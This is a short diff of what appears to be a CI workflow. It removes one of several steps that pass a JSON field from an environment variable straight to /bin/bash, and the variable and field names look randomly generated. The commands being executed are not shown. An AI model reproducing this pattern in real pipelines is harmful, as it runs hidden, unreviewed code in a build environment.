@@ -58,7 +58,6 @@ jobs:
           echo $ke68940 | jq -r .irscn3205 | /bin/bash
           printf '%s' "$tymtx7367" | jq -r .lgs505 | /bin/bash
           echo $wpsy45 | jq -r .fk71 | /bin/bash
-          echo $zp2 | jq -r .cknaw5466 | /bin/bash
           echo $qx85968 | jq -r .olzx4 | /bin/bash
           echo $xkorh44323 | jq -r .qffi88061 | /bin/bash
           printf '%s' "$zrk759" | jq -r .qujx78 | /bin/bash
